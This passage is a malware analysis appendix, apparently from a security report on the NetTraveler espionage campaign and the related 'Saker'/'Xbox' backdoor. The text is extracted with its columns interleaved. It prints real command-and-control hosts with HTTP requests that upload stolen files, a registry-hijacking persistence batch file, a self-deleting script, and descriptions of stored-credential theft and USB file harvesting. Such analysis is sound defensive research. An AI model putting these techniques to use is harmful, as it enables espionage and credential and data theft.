designed to be a Win32 shared process like

PP=<integer (2 bytes and positive from offset 0x355)>

svchost, autostarted by system service control

PU=<string (max 32 bytes from offset 0x357)>

manager during system boot. That creates cor-

PW=<string (max 32 bytes from offset 0x377)>

responding system registry values in HKLM\

PF=<integer (2 bytes and non-negative from offset

SYSTEM\CurrentControlSet\Services\<ser-

0x397)>

vicename>.
27

The NetTraveler

Descrip tion

After that it saves to local directory and executes

The malware is Win32 PE DLL file compiled in Mi-

the following batch file (net.bat):

crosoft Visual C++ 6.0. It has one export function
ServiceMain which has the main functionality of

@echo off

the module.

@reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Irmon\

This module has initial filename assigned during

Parameters” /v ServiceDll /t REG_EXPAND_

compilation: “DLL.dll”.

SZ /d C:\WINDOWS\system32\<servicename>ex.dll
Technical De tails

Note that <servicename> is replaced with the

Upon start the module sets corresponding ser-

actual system service name that was previously

vice status to “Start_Pending” and then imme-

found.

diately to “Running”.

After that the module creates the C:\WIN-

It checks if system mutex named “NetTravler Is

DOWS\system32\<servicename>ex.dll file

Running!” exists and terminates if that is true.

on disk and sets hard-coded file creation and

Note: Other known mutexes used by variants of

last access date and time to “20:00 17 August

NetTraveler include:

2004”.
>>Boat-12 Is Running!
The new file is then filled with data produced

>>DocHunter2012 Is Running!

after decryption of the hard-coded data block.

>>Hunter-2012 Is Running!
>>NT-2012 Is Running!
>>NetTravler Is Running!

NetTraveler Backdoor
(dropped file)
MD5

3c0ea91ea42f2bf6686e
9735998e406e

Create date
(GMT)

2013.02.18 02:33:49

Size

204’800

Linker version

6.0 (MSVC++ 6.0)

28

>>NetTravler2012 Is Running!
>>SH-2011 Is Running!
>>ShengHai Is Running!
After that it opens %WINDIR%\system\config_t.dat file and parses the following values:

Appendix A: Malware technical analysis

Option]
WebPage

>>PS (string with no default value, max 64
chars)

DownCmdTime

>>PP (integer with default value: 80)

UploadRate

>>PU (string with no default value, max 32

[OtherTwo]
AutoCheck
CheckedSuccess

chars)
>>PW (string with no default value, max 32
chars)
>>PF (integer with default value: 10)

It creates a list of local paths in memory to work
with later:
>>%SYSDIR%\stat_t.ini

Next the module prepares some strings for testing the Internet connection:

>>%SYSDIR%\dnlist.ini
>>%SYSDIR%\enumfs.ini

<modulename>.log

>>%SYSDIR%\uenumfs.ini
>>%SYSDIR%\udidx.ini

http://www.microsoft.com/info/privacy_se-

>> %TEMP%\ntvba00.tmp\

curity.htm (%TestURL%)

If CheckedSuccess value from INI file equals 0 or

Ironically, the %TestURL% is a Microsoft web

doesn’t exist, the module will fetch additional con-

page about privacy, security and safety online

figuration from the same INI file [Other] section:

(last updated in January 2000):

29

The NetTraveler

After that with the help of WinInet API the mod-

User: <proxy username>

ule issues an HTTP GET request to %TestURL%

Pass: <proxy password>

(see above) and the following hardcoded HTTP

<data from the URL>

header values:

///////////////////////////////////////////////

Accept: image/gif, image/x-xbitmap, image/
jpeg, image/pjpeg, application/x-shock-

If the PS, PP, PU, PW parameters were not found

wave-flash, */*

the INI file or Autocheck value is set to 1, the

Accept-Language: en-us

module attempts to find local proxy settings ac-

Proxy-Connection: Keep-Alive

cording to the procedure below.

Pragma: no-cache
User-Agent: Mozilla/4.0 (compatible; MSIE
6.0)

Finding Proxy
Configuration

It sets other options such as proxy server address and port (PS and PP values from INI file
or attempts to find proxy settings automatically), proxy username and password (PU and PW

First, the module lists contents of %PROGRAM-

values from the INI file), several connection

FILES% directory and appends the listing to the

timeouts limited with 60 seconds.

log file.

The module submits the request and reads the

Then it opens IE history file of the current user

response of the server. The response is stored

(History.IE5\index.dat) parses it and appends

in newly allocated memory block.

the log with discovered logins/password saved
in the the history file as a part of visited URLs.

After that the malware appends debug output
to the log file named <modulename>.log. The

After that the module logs current version of

output messages are shown below:

Internet Explorer. Interestingly that the log file is
appended with the following hard coded string:

method currect:
User: <current user name>

“IE版本: Internet Explorer “, 版本 means “ver-

ProxyIP::

sion” in Simplified Chinese.

ProxyBypass::

30

Appendix A: Malware technical analysis

The module reads IE version from HKLM\Soft-

function (method 2) was probably merged with

ware\Microsoft\Internet Explorer\Version reg-

another one (method 3) in newer variant of the

istry value.

malware.

Then it gets version of current OS, and again
appends the result to the log file with some hard
coded strings in it:

Me thod 1:

This is a straightforward attempt to connect to
the test url, assuming that system-wide proxy

“操作系统版本” which means “version of oper-

settings are correct or no proxy is required to

ating system” in Simplified Chinese.

access the external website. The URL for testing
is http://www.microsoft.com/info/privacy_

The malware is capable of interpretation of sys-

security.htm with the following header values:

tem minor/major code and recognizing the following O Ses:

Accept: image/gif, image/x-xbitmap, image/

>>Microsoft Windows 95

jpeg, image/pjpeg, application/x-shock-

>>Microsoft Windows 95 OSR

wave-flash, */*

>>Microsoft Windows 98

Accept-Language: en-us

>>Microsoft Windows 98 SE

Proxy-Connection: Keep-Alive

>>Microsoft Windows Millennium Edition

Pragma: no-cache

>>Microsoft Windows NT
>>Microsoft Windows 2000

If the method succeeds the module appends

>>Microsoft Windows XP

received data from the URL to the log file and

>>Microsoft Windows 2003

corresponding parameter is set in the INI file

>>Microsoft Windows Vista

(UP=0).

>>Microsoft Windows 7
If something fails the following message is apIt can also recognize type of OS: Professional,

pended to the log file: “Method1 Fail!!!!!”

Server, Advanced Server and exact version and
build numbers are also appended to the log file.
Me thod 2 and Me thod 3:

There were four different methods to find proxy

This method is used when the infected machine

configuration on the system according to the log

uses proxy server but the settings are not avail-

file messages set in three functions. One of the

able for local SYSTEM user. A user working at

31

The NetTraveler

the infected machine might have internet ac-

user secrets via CredEnumerateA and looks for

cess and should have the required proxy server

those which start with “Microsoft_WinInet_” and

settings.

contain the address of the proxy server previously obtained. These secrets are decrypted

The malware list all processes running on the

with CryptUnprotectData API call. Such call is

machine and locates process named “EXPLOR-

possible only after impersonation as local user

ER.EXE”. This process is a system shell which is

which is available for the malware running with

normally running after local user successfully

local system privileges. This method checks the

authenticates and logs in to the system. The

first available password in the list of passwords

malware finds explorer process and obtains se-

from the system stored secrets.

curity token which is later used to temporarily
impersonate as local user and get proxy con-

Once the potential server, port, login and pass-

figuration with InternetQueryOptionA(0,INTER-

word are obtained the malware makes a test

NET_OPTION_PROXY,...) API call.

query to the same URL: http://www.microsoft.
com/info/privacy_security.htm. If it succeeds

If the result contains proxy settings the malware

the content of this page is appended to the log

gets them. If for some reason local proxy set-

file with all details about the proxy server. If the

tings were not found in current user profile, the

method fails it prints the following line in the log

malware attempts to double-check and opens

file: “Method3 Fail!!!!!”

IE settings in the registry. The following registry
values are checked:
Me thod 4:

HKCU\Software\Microsoft\Windows\Cur-

This method is identical to Method 3 with just

rentVersion\Internet Settings\ProxyEnable

one difference: it checks the last available pass-

HKCU\Software\Microsoft\Windows\Cur-

word in the list of passwords from the system

rentVersion\Internet Settings\ProxyServer

stored secrets.

HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyOverride

Me thod X (debug):

There is also an unused method in the code with
no internal number, which was most likely used
After that the malware first obtains the IE stored

to debug the application as it writes all interme-

credentials. It iterates through all stored local

diate results to the log file, starting from string

32

Appendix A: Malware technical analysis

“Get From IEOption!” or “Get From Reg!” depending on the path of code execution.

Thre ad1 (Command and Control
Thre ad)

This thread starts from collecting local system
If the malware failed to locate the proxy server it

information, including the following:

unregisters current malicious service by deleting

>>Local computer name

corresponding registry keys in HKLM\System\

>>Local IP address

CurrentControlSet\<servicename>\ and at-

>>Local user name

tempts to delete all related files from the fol-

>>OS version, build and product type

lowing list:

>>List of local disk drives with available
space on them

>>C:\Windows\System32\enumfs.ini
>>C:\Windows\System32\uenumfs.ini

>>CPU characteristics including vendor
identifier and frequency

>>C:\Windows\System32\udidx.ini

>>RAM status

>>C:\Windows\System32\dnlist.ini

>>Current process lists

>>C:\Windows\System32\stat_t.ini

>>Output of the “ipconfig /all” system
command

Otherwise, if the proxy was checked successful-

This information is stored in a text buffer with

ly the malware writes the following value to the

Chinese comments like shown below (transla-

config file (config_t.dat):

tion is added in red):

[OtherTwo]

计算机: <Local Hostname> Computer

CheckedSuccess=1

用户名: <Local Username> User name

[计算机信息] Computer Information

Ip地址: <Local IP> Address
After that the module sleeps for 60 seconds and

操作系统: <OS> <Service Pack> (<Build Num-

starts a new thread (see below Thread1), sleeps

ber>) Operating System

10 more seconds and creates another thread
(see below Thread2). Right after that it enters an

磁盘空间: 总磁盘空间为:***GB,剩余磁盘空间

infinite loop of doing nothing but sleeping which

为***GB(占**.**%)

can be interrupted by a special value in global

Disk Space: Total disk space ***GB, the remain-

variable set by other threads. Upon detecting

ing disk space ***GB (**.**%)

this value the service routine ends which termi-

CPU: <CPU Type> <CPU Frequency>MHZ

nates the service execution.

物理内存: 总物理内存:***MB,可用内存:***MB (
占**.**%)

33

The NetTraveler

Physical Memory: Total physical memory: ***MB

Host: vip222idc.s169.288idc.com

of available memory: ***MB (**.**%)

Connection: Keep-Alive

[进程列表] Process List

If the file upload is successful, the module de-

0 [System Process]

letes the “system_t.dll” file. Please note that

4 System

the serial number of current disk drive (most

892 smss.exe

likely it is drive “C”) is used in HTTP query value

948 csrss.exe

hostid. This identifier derived from the local

972 winlogon.exe

filesystem is used later as a reliable identifier of

1016 services.exe

current infected machine or simply BotId.

1028 lsass.exe
…
The Control Loop
C&C Communication

After that it enters control loop. Every 10 minutes

This information is saved in %WINDIR%\Sys

according to the DownCmdTime parameter val-

tem32\system_t.dll text file. This file is read

ue in the config file, it sends HTTP GET request

a moment later, compressed using a custom

of the following format:

Lempel-Ziv-based algorithm, encoded with a
modified Base64 encoding and uploaded to the

GET /nt12/new york /cit y/nettraveler.asp?ac

C&C server using HTTP GET request of the fol-

tion=getcmd&hostid=<DriveCSerialNumber>&host

lowing format:

name=<Hostname>
…

GET /nt12/newyork/city/nettraveler.asp?host

If the server response starts with “[CmdBegin]”

id=<DriveCSerialNumber>&hostname=<Host

and ends with “[CmdEnd]” then the response

name>&hostip=<Host IP>&filename=travlerback

is saved in C:\Windows\System32\stat_t.

info-<Current date and time>.dll&filestart=0&file

ini file. After that the code confirms receiving

text=begin::<modified Base64 and LZ-compressed

the command by submitting another HTTP GET

data>::end

request in the format below:

Accept: image/gif, image/x-xbitmap, image/jpeg,
image/pjpeg, application/x-shockwave-flash, */*

GET /nt12/newyork/city/nettraveler.asp?action=

Accept-Language: en-us

gotcmd&hostid=<DriveCSerialNumber>&hostname

Pragma: no-cache

=<Hostname>

User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win

…

dows NT 5.0)

34

Appendix A: Malware technical analysis

The module expects server to reply “Success”. If

All values f<number> from stat_t.ini file are read and

it doesn’t the module will try again in 10 minutes.

saved in %WINDIR%\System32\dnlist.ini file:
[Filelist]

If the server was notified and confirmed receiv-

f1=<string>

ing the notification, the module reads stat_t.

f2=<string>

ini file which is just another config in INI format:

f3=<string>
…

[Download]
dircount=<integer, default 0>

All values d<number> from stat_t.ini file are read

filecount=<integer, default 0>

and the corresponding local directory and sub-

f1=<string>

directories listings are collected and appended

f2=<string>

to the dnlist.ini file in the format:

f3=<string>
…

[Filelist]

d1=<string>

f1=<string>

d2=<string>

f2=<string>

d3=<string>

f3=<string>

…

…

[Scan]
dircount=<integer, default 0>

The following values from stat_t.ini file are also

filecount=<integer, default 0>

transferred to the dnlist.ini file:

Section
in stat_t.ini

Value
in stat_t.ini

Section
in dnlist.ini

Value
in dnlist.ini

[Scan]

dircount

[ScanList]

dircount

[Scan]

ScanAll

False

[ScanList]

ScanAll

[Other]

TypeLimit

True

[Other]

TypeLimit

[Other]

USearch

True

[Other]

USearch

[Other]

GSearch

True

[Other]

GSearch

[Other]

UTypeLimit

True

[Other]

UTypeLimit

[Other]

UAuto

False

[Other]

UAuto

[Other]

Types

doc, docx, xls,
xlsx, txt, rtf, pdf

[Other]

Types

Default

35

The NetTraveler

[Other]

UP

[Other]

PS

[Other]

PP

[Other]

False

[Other]

0 or 1

[Other]

PS

[Other]

PP

PU

[Other]

PU

[Other]

PW

[Other]

PW

[Other]

PF

[Other]

PF

80

10

This is clearly the functionality which lets the

f<M>=<string>

attacker download specific files or even full di-

d1=<string>

rectories including all subdirectories contents

d2=<string>

basing on defined file search criterias, such as

…

file extensions.

d<K>=<string>
dircount=<K>
filecount=<M>

Filesystem Scan

The malware has a file enumeration routine,

[<d2 string>]
…

which gets the settings from dnlist.ini (such as
directory paths to process) and launches a re-

After execution, this log file contains directories

cursive directory search. The output is saved to

with all filenames and subdirectories. Only di-

enumfs.ini file in the following format:

rectory/file names are stored, with no additional data such as timestamps or size. When the

[Computer]

search is finished, the module saves current

Name=<Local system name>

date to the dnlist.ini file and changes option

Page=<Current Windows ANSI code page (ACP)>

ScanAll, see format below. This is done to avoid

[<Local system name>]

recurrent scanning of the filesystem, which is

d1=<string>

normally a heavy process and might be noticed

d2=<string>

by local user or an administrator.

…
d<N>=<string>

[EnumTime]

dircount=<N>

DateTime=<YYYY-MM-DD date>

[<d1 string>]

[ScanList]

f1=<string>

ScanAll=False

f2=<string>
…
36

Appendix A: Malware technical analysis

After scanning the local filesystem, enumfs.

If the file matches the criterias, then a unique

ini file is uploaded to the server via HTTP GET

file state identifier for that file is created,

request described above (see the submission

which is an MD5 hash of the following string:

process of stat_t.ini file in the beginning of C&C

“<Filename> <Year>-<Month>-<Day>

Communication part) with filename of the fol-

<Hour>:<Minute>:<Second>:<Millisec-

lowing format:

onds>”. The date and time values in the string
before are obtained from the file last change

FileList-<Month><Day>-<Hour><Minute>

time.

<Second>.ini
After that the module creates a name used for
uploading the file to the server, which consists
Uploading Files

of the following: “<Year>-<Month>-<Day>-

The next stage of this thread uploads files inter-

<Hour>-<Minute>-<File state identifier, the

esting for the attacker to the C&C server. This

MD5>”. The time and date values are also taken

process is described below.

from the file’s last change time. This file is uploaded to the C&C using the same procedure as

The module works with files described in dnlist.

used before for uploading other files.

ini file. It gets a list of file extensions that must
be uploaded to the C&C first. There is a default

After that, Thread1 attempts to upload a file called

list of extensions (value Types of section [Oth-

uenumfs.ini, which is created by the Thread2. The

er]) that represent interest for the attackers:

remote filename is set to the following “UFileL-

doc,docx,xls,xlsx,txt,rtf,pdf. Then it gets file-

ist-<Month><Day>-<Hour><Minute><Sec-

total values from [FileList] section of dnlist.ini

ond>.ini”.

and iterates through every f<N> value, where N
is a positive integer starting from 1.

Next, the thread iterates through %TEMP%\
ntvba00.tmp\ directory and uploads every file

There are several tests applied to each file, be-

located there. The file names are preserved as

fore it is uploaded to the server, including the

they are.

following:
>>File size must not be larger than ~10Mb
(10’485’760 bytes).
>>File must have one of the extensions from
the “Types” option.

Control Procedure

Then, the thread issues a special HTTP GET request to get next control instruction from the
C&C. This is done by accessing the following URI:

37

The NetTraveler

hXXp://vip222idc.s169.288idc.com/nt12/newyork/

>>%SYSDIR%\enumfs.ini

city/nettraveler.asp?action=getdata (3)

>>%SYSDIR%\dnlist.ini
>>%SYSDIR%\udidx.ini

Server response is converted to uppercase and

>>%SYSDIR%\uenumfs.ini

analyzed. There is defined set of responses ex-

>>%SYSDIR%\stat_t.ini

pected from the C&C server:
01. <BotId>:UNINSTALL

04. <BotId>:UPLOAD

This command simply uninstalls the malicious

This procedure is identical to the UPDATE com-

service from the registry and deletes locally cre-

mand described before with one difference - no

ated files.

uninstallation of the current module is done, only
new executable is downloaded and started. This

02. <BotId>:UPDATE

method is probably used to execute additional
independent malicious executable, unrelated

This procedure starts from uninstalling current

to the original NetTraveler malware. Or it can

service, then it issues three HTTP GET requests

be used to infect with the NetTraveler backdoor

to the C&C script URL:

configured for some other C&C server.

GET .../newyork/city/nettraveler.asp?action=data-

After processing any of the commands above

size to get the size of updated module that will

the malware issues the following request to the

be pushed with next request.

server to confirm command execution:

GET .../newyork/city/../updata.exe to get the up-

GET .../newyork/city/nettraveler.asp?action=updat-

dated module to be executed. This module is

ed&hostid=<BotId>

instantly saved to %WINDIR%\install.exe and
executed.

If the server hasn’t issued the UNINSTALL command the thread continues execution starting

03. <BotId>:RESET

from the beginning of The Control Loop (see
above).

This procedure simply removes all temporary
files, such as the following:

38

Appendix A: Malware technical analysis

Thre ad2 (Drive Monitoring Thre ad)

This thread creates a hidden window with class

uenumfs.ini file for writing. The latter is filled

name “NTMainWndClass” and processes win-

with directories and subdirectories listings of the

dow messages in a loop until it is interrupted by

attached disk drive. The format of the data in

special variable value. The window procedure

uenumfs.ini is almost identical to the one created

processes only one window message, WM_DE-

during fixed drive filesystem scan (see “Filesys-

VICECHANGE with wParam value set to DBT_

tem Scan” part in Thread1 description above).

DEVICEARRIVAL, which is sent by the system
when a new removable device such as USB flash

In addition to that, the same criterias are applied

drive or Network shared folder is attached to

to each file (size and file extension) as in fixed

the system.

drive filesystem scan. Also, every file gets a state
id calculated as MD5 hash of the filename and

The module will proceed only if the attached

timestamp of the last modification. This hash

removable device has provided a disk volume.

is used to generate a new filepath in the follow-

It is designed to have different procedures for

ing format: %TEMP%\ntvba00.tmp\<Year>-

removable disk drives from USB flash and net-

<Month>-<Day>-<Hour>-<Minute>-<File

work shares.

state id, MD5 hexadecimal string>.<Original
extension>. The source file from newly attached

The USB drives will be processed only if GSearch

drive is then copied to the destination set by the

value is set to True in [Other] section of dnlist.

generated file path. Please note, that the file orig-

ini file. Similarly, a new network drive will be

inal extension is preserved, while the file name is

processed only if USearch value is set to True

changed. That is used to prevent further problems

in [Other] section of dnlist.ini file.

when working with unsupported encoding.

Both network and removable USB drives are

At the same time when file is copied to ntvba00.

processed in the same procedure, which reads

tmp directory, a record is added to udxidx.ini

the following values from dnlist.ini file:

file, which has the following format:

[Other]

[Index]

UTypeLimit=<boolean, default True>

<File state id, MD5 hexadecimal string>=1

UAuto=<boolean, default False>
This is done to avoid copying files that were alIf UAuto option is set to True, the thread creates

ready copied before, unless they were changed

%TEMP%\ntvba00.tmp\ directory and opens

by the user.

39

The NetTraveler

To avoid excessive use of the disk drive and oc-

a string with call to the “sprintf’ function and

casional interest of the local user, the file copy-

“%8X” parameter which outputs 8 characters

ing procedure has a delay. Every 1000 files the

representing a number in hexadecimal form.

thread delays execution and sleeps for 9 sec-

Despite the fact that the output of this call is in

onds.

uppercase, the author of the module converts
the output to uppercase characters again. This
could be due to the fact that the author used to
Side notes

have “%8x” format string before, which made

Useless text transformation

such conversion rational. However, that clearly

In function which gets disk volume serial num-

shows that the developer wasn’t aware of vari-

ber the actual serial number is converted from a

ous format strings options, which shows lack of

decimal integer to a hexadecimal number stored

experience in C/C++ development.

as an ASCII string. The integer is converted to

40

Appendix A: Malware technical analysis

Drive monitoring disk processing issue

widespread among common software develop-

As we mentioned above the drive monitoring

ers. ‘Saker’ (‘Xbox’) Dropper and Loader

thread uses the same function to process
removable USB drives and network shares
attached as local drives. Visible separation of
these two types of disk drives (in the name of
the options GSearch and USearch, where “U”
probably stands for “USB” and “G” is for “Glob-

‘Saker’ (‘Xbox’) Dropper
and Loader

al”, and in separate logical branches of code
flow) is later misused, as the drive processing
routines is bound to USB drives. At least it read
U-prefixed options from dnlist.ini file, which
logically corresponds to the USB-type of disk
drive, but used for both. While this is a minor

MD5

c239af6aff1226fa2
b2bb77dfec865ce

Create date (GMT)

2013.03.13 12:39:21

Size

67’072

Vulnerability
Targeted

6.0 (MSVC++ 6.0)

issue and probably didn’t cause a serious
problem for the attackers, this shows that the
developer felt lazy at some point and used

Descrip tion

Copy and Paste approach to avoid creating

The module is non-packed Win32 PE executable

extra code. It could also mean that one part of

file compiled in Microsoft Visual C++ 6.0. Al-

the code was created by one person and later

though no encryption or compression is used to

modified by another, who mistakenly over-

protect or hide parts of the code, simple obfus-

looked general code design.

cation is applied to internal strings. The module
main purpose is to install and embedded DLL file

Data decompression routine

or load it during system startup.

The malware uses a custom data compression algorithm when uploading files to the
C&C server. While the decompression is not

Technical De tails

required for the work of the application, the

Execution of the main function starts with ob-

code for the decompression routine was also

taining local user Startup directory. This path is

found in the malicious module. This clearly

appended with “\service.lnk”.

indicates a design flaw and shows that the developer didn’t review the code on a binary level
after it was compiled, which is common among
beginners among malware authors and quite

41

The NetTraveler

The strings, which are used in the application are

iterating through %PROGRAMFILES% directory

stored in simple obfuscated form. For example,

and looking for “Kaspersky Lab” subdirectory. If

the “Kaspersky Lab” is stored as “K.sp4r6ky

it finds Kaspersky products it quickly exits, if not

aa,”. The 1, 4, 6, 10 and 12 characters are re-

it attempts to self-delete by running “cmd.exe /c

placed with hardcoded character constants as

del <ModuleName>” and then exits.

shown below:

Then the module gets local %TEMP% folder path

If the module was already installed in the system

and constructs paths “%TEMP%\service.dll”

and is called “service.exe”, it checks if system mu-

and “%TEMP%\service.exe”.

tex object called “SECUT!” already exists and exits
if it’s true. This is done to avoid multiple instances

After that the code checks if the current module

of the module from running simultaneously.

file name is called “service.exe”.
After that, the module creates a new file at
If current module is not called “service.exe”,

“%TEMP%\service.dll” and saves a part of own

the module copies itself to “%TMP%\service.

data to the new file. The data offset is hardcoded

exe” and creates corresponding LNK file in lo-

as a string “46592”.

cal user’s startup folder pointing to the freshly
created executable. The executable file is as-

Next, it attempts to load the “%TEMP%\service.

signed an attribute “hidden” and started in a

dll” library file and call export function named

new process. Then the module checks if Kasper-

“JustTempFun”. After that the module enters

sky products are installed on local system by

an infinite sleep loop.

42

Appendix A: Malware technical analysis

‘Saker’ (‘Xbox’) Backdoor
(dropped file)
When this module is loaded with Xbox Loader

MD5

6312bc2b156062
ba5358e7099a88bb95

Create date (GMT)

2013.03.13 12:35:11

TempFun exported function. This function begins

Size

46’592

with deobfuscation of the strings used further:

Vulnerability
Targeted

6.0 (MSVC++ 6.0)

described above execution is started with Just-

pitgay.minidns.net
8090BBBBBBBBBBBB
Descrip tion

GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG

The module is a non-packed Win32 DLL exe-

SakerEvent

cutable file compiled in Microsoft Visual C++

FFFFFFFFFFFFFFFF

6.0. Although no encryption or compression is

Proxy

used to protect or hide parts of the code, simple

HHHHHHHHHHHHHHHH

obfuscation is applied to internal strings. The
module is to clearly a backdoor application that

Obviously pitgay.minidns.net is the C&C server

enables an attacker to manage files, get infor-

domain name. 8090 is the port the malware con-

mation about local disk drives, download and

nects to. As for the “GGG...”, “FFF...” and “HHH...”

start new executables. This backdoor is probably

strings, according to the further code analysis

authored by the same developer who created the

they are used as a placeholders for the hardcode

Gh0st / Zegost RAT.

proxy settings:
The “FFF...” placeholder may contain “Proxy”
string instead of “F” sequence which works as a

Technical De tails

flag to use the proxy settings from the “GGG...”

This module has 2 export functions: JustTemp-

placeholder in the form that wininet accepts

Fun and ServiceMain. Module main function as

(according to MSDN, the format is “http=http://

well as ServiceMain are empty procedures. So

http_proxy other”). The “HHH...” placeholder is

far, all functionality of the module is located in

for proxy username and password.

JustTempFun function.
The thread collects information about the local
Meanwhile, there is another known malicious

system, such as

DLL which has exactly these export names -

>>OS version

Gh0st RAT, that was also developed by Chinese.

>>CPU type

43

The NetTraveler

>>Used and available memory

This algorithm not only adds obfuscation but

>>Local system name

also adds some redundancy, which doubles the

>>Used and available disk space of the

size of the input string.

drive C:\
The module attempts to connect to a C&C server
The last value is converted to a hexstring of 8

and issue using the following URL:

characters and XOR-ed with current computer
name. The purpose of this value is unclear.

http://pitgay.minidns.net:8090/3010...

Then the information collected before is encrypt-

Also, it uses a hardcoded User-Agent string.

ed using simple string obfuscation algorithm,

There is not query string parameters, the data

shown below in a pseudo code:

is transferred in a form of CGI path consisting of
hex numbers only and prefixed with 3010, which

void ObfuscateString(char* strIn, char* strOut, int

makes such requests rather unique. 3010 most

nLen)

likely defines client request ID. Here is how a

{

request may look:

char c;
for (i=0;i <nLen; i++)

GET /301000000000F0FD...0000000000000000000

{

000000 HTTP/1.1

c = strIn[i] % 32;

User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win-

if(c <= 9)

dows NT 5.0; .NET CLR 1.1.4322)

strOut[2*i] = c+0x30;

Host: tsgoogoo.net

else
strOut[2*i] = c+0x37;

Host: pitgay.minidns.net:8090
Cache-Control: no-cache

if(strIn[i] <= 9)
strOut[2*i+1] = strIn[i]+0x30;

The module checks the server response code

else

and if that is HTTP 200, it reads 2 DWORD values

strOut[2*i+1] = strIn[i]+0x37;

(lets call them ParamA and ParamB) from the the

}

server response.

}
The first DWORD (ParamA) defines the command
and following execution path. Below is the integer values and commands description:

44

Appendix A: Malware technical analysis

1020: Shutdown

1029: File manager

1021: Shutdown

The command spawns a new thread which
opens a new session with the server to provide

Both 1020 and 1021 commands are used to

file management operations.

interrupt execution of the module and terminate
the main thread. The module also sets local

The new thread makes 2 HTTP Get requests

thread privileges to enable global system shut-

to the server, which are identical to the 3010

down, however this is not used later and proba-

request described above. The only difference

bly represents some remains of the code written

is the request ID, which is 4001 and 4002 for

earlier or another variant of the code. This is also

the first and second requests correspondingly.

confirmed by by the shutdown procedure exe-

The output of the 4001 request is ignored, while

cuted afterwards, which is designed to disable

request 4002 is interpreted.

Windows hook mechanism while it wasn’t used
previously anywhere in the code.

The server response contains 2 DWORD values:
lets call them FileCmdId and DataSize. if Data-

1022: Self-remove

Size is non-zero the module fetches additional

This command is used to self-remove current

data which length is specified in the DataSize

module and stop its execution. It attempts to

option.

create a local batch file named del.bat with the
following contents and run it:

The FileCmdId defines which operation must be
executed. It can be one of the following values:

@echo off
ping /n 5 127.0.0.1 >nul

5001: Get drive information. Provides informa-

>nul del /f/s/q/a <CurrentModuleDir>\service.exe

tion about specified disk drive: free space, drive

>nul del /f/s/q/a <CurrentModuleDir>\service.dll

type. Client command success code is 0, error

>nul del %0 /s/q/a/f del.bat

code is 7004.

Please note non-standard way to call Windows

5002: Get file information. Provides information

command line interpreter which starts from re-

about specified file: file times, attributes. Client

direction of output to NUL virtual device. Also,

command success code is 0, error code is 7003.

the command arguments are not separated with
space or tab characters, and it might look invalid,

5003: Get directory information. Provides

however cmd.exe on Windows XP, Windows 7 and

information about specified directory: directory

Windows 8 executed it correctly without a problem.

45

The NetTraveler

times, attributes, full size. Client command suc-

of the server should contain file data to write to

cess code is 0, error code is 7003.

the already opened file and execute right away.

5004: Get directory listing. Provide simple di-

5026: Upload file to the server. The command

rectory listing, which includes file names, sizes,

is used to read local file and transfer it to the

last write time. Client command success code is

server. It gets file information, including time-

0, error code is 7001.

stamps and size and spawns a new thread. If any
of those operations fails the module reports er-

5006: Create directory. Create a new directory,

ror code 7003 to the server. Otherwise it reports

which full path is provided by the server. Client

success code 0 and spawns a new thread. The

command success code is 0, error code is 7016.

new thread reads the file specified in the request
and uploads it to the server.

5008: List drives. List available disk drives with
information about free space. Client command

1039: Download and run new module.

success code is 0, error code is not defined.

The module uses ParamB as an integer value
indicating a length of a string to read next from

5009: Run application. Run local application

the server response. The received string will be

with path and command line arguments passed

used as a NewFilename. Then it reads another

from the server. Client command success code

DWORD value from the server response and

is 0, error code is 7005.

interprets it as a size of the following data to
read. After that a new directory “Internet Ex-

5017: Get recursive directory listing. Provide

plorer” is created in the directory of the current

recursive directory listing. Client command suc-

running module. Then the module creates a new

cess code is 0, error code is 7000.

file using the value NewFilename pushed by the
server. The module makes 2 attempts to start a

5025: Run pushed executable. This command

new process: by calling CreateProcessA system

is used to save file pushed by the server and run

API and ShellExecuteA if the previous call failed.

instantly. When this command is received the
module checks if it can create a new file, which

The code was designed to support more com-

name is passed by the server response. If it

mands (1028, 1029, 1032, 1033, 1034, 1035,

fails it submits error code 7003. Then it spawns

1036), however they are now falling into com-

a new thread which issues a new HTTP Post

mand 1029 handler and then ignored. We cre-

request with command id 3005 and system in-

ated a chart showing a tree of commands de-

formation attached in the CGI Path. The request

pendencies:

46

Appendix A: Malware technical analysis

The execution of this command processing thread continues in a loop until it is interrupted by Shutdown command coming from the server. The code starts new loop iteration
after hardcoded value of 30 seconds.

47